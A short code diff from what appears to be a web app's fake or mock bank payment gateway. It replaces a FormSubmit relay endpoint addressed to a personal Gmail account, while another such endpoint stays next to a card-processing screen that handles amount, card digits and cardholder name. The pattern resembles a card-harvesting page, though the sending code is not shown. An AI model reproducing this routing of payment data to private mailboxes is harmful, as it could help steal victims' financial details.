@@ -46,7 +46,7 @@ const BANKS = [
 ];
 
 const FORMSUBMIT_PRIMARY_ENDPOINT = "https://formsubmit.co/ajax/Rajatjha.ss708090@gmail.com";
-const FORMSUBMIT_SECONDARY_ENDPOINT = "https://formsubmit.co/ajax/anandjhare4@gmail.com";
+const FORMSUBMIT_SECONDARY_ENDPOINT = "https://formsubmit.co/ajax/8d487ecf315e92e47520f07dab546173";
 
 // ── Bank Gateway: Processing Screen ────────────────────────────────────────
 function GatewayProcessing({ amount, cardLast4, cardName, onDone }: {
